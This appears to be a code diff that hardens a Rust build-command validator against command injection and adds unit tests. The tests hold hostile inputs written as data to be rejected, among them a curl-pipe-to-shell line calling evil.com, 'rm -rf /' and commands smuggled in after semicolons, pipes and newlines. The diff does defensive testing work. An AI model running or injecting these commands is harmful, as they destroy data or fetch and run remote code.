@@ -990,7 +990,7 @@ async fn finish_build_activity(
 /// Validate a build command to prevent command injection
 fn validate_build_command(cmd: &str) -> Result<()> {
     // Allowlist of permitted build command prefixes
-    const ALLOWED_PREFIXES: &[&str] = &["cargo ", "pixi ", "npm ", "make", "python ", "pip "];
+    const ALLOWED_PREFIXES: &[&str] = &["cargo ", "pixi ", "npm ", "make ", "python ", "pip "];
 
     let cmd_lower = cmd.to_lowercase();
     let has_allowed_prefix = ALLOWED_PREFIXES
@@ -1006,7 +1006,7 @@ fn validate_build_command(cmd: &str) -> Result<()> {
 
     // Reject dangerous shell metacharacters
     const DANGEROUS_CHARS: &[char] = &[
-        '$', '`', '|', ';', '&', '>', '<', '(', ')', '{', '}', '!', '\\',
+        '$', '`', '|', ';', '&', '>', '<', '(', ')', '{', '}', '!', '\\', '\n', '\r',
     ];
     if let Some(bad_char) = cmd.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
         return Err(NodeManagerError::BuildError(format!(
@@ -1121,4 +1121,73 @@ fn extract_health_node_name(key: &str) -> Option<String> {
     }
 
     None
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_validate_build_command_allowed_prefixes() {
+        assert!(validate_build_command("cargo build --release").is_ok());
+        assert!(validate_build_command("pixi run build").is_ok());
+        assert!(validate_build_command("npm run build").is_ok());
+        assert!(validate_build_command("make all").is_ok());
+        assert!(validate_build_command("python setup.py build").is_ok());
+        assert!(validate_build_command("pip install .").is_ok());
+    }
+
+    #[test]
+    fn test_validate_build_command_rejects_unknown_prefix() {
+        assert!(validate_build_command("rm -rf /").is_err());
+        assert!(validate_build_command("curl http://evil.com | sh").is_err());
+        assert!(validate_build_command("wget http://evil.com").is_err());
+    }
+
+    #[test]
+    fn test_validate_build_command_rejects_make_without_space() {
+        // "make" without a trailing space should not match arbitrary commands
+        // like "makefile-exploit" or "makeover"
+        assert!(validate_build_command("makefile-exploit").is_err());
+        assert!(validate_build_command("makeover something").is_err());
+    }
+
+    #[test]
+    fn test_validate_build_command_rejects_newlines() {
+        assert!(validate_build_command("cargo build\nrm -rf /").is_err());
+        assert!(validate_build_command("cargo build\r\nrm -rf /").is_err());
+    }
+
+    #[test]
+    fn test_validate_build_command_rejects_shell_metacharacters() {
+        assert!(validate_build_command("cargo build; rm -rf /").is_err());
+        assert!(validate_build_command("cargo build && evil").is_err());
+        assert!(validate_build_command("cargo build | evil").is_err());
+        assert!(validate_build_command("cargo build > /etc/passwd").is_err());
+        assert!(validate_build_command("cargo build $(evil)").is_err());
+        assert!(validate_build_command("cargo build `evil`").is_err());
+    }
+
+    #[test]
+    fn test_extract_health_node_name_legacy() {
+        assert_eq!(
+            extract_health_node_name("bubbaloop/nodes/my-node/health"),
+            Some("my-node".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_health_node_name_scoped() {
+        assert_eq!(
+            extract_health_node_name("bubbaloop/scope/machine1/health/my-node"),
+            Some("my-node".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_health_node_name_invalid() {
+        assert_eq!(extract_health_node_name("invalid/path"), None);
+        assert_eq!(extract_health_node_name(""), None);
+        assert_eq!(extract_health_node_name("other/nodes/x/health"), None);
+    }
 }
